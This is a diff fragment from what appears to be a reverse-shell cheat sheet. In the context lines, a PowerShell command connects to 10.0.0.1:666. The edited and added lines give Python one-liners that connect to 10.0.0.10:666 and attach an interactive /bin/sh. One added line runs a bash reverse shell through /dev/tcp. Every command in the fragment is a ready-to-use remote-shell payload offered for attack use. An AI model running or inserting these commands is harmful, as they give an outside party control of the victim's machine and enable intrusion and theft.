@@ -33,11 +33,17 @@ powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',666)
 ```
 
 
+
 **Python for Linux**
 
 ```
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.10",666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
+_or_
+```
+__import__("os").system("bash+-c+'bash+-i+>& /dev/tcp/10.0.0.10/666 0>&1'")
+```
+
 
 **Python for Windows**
 
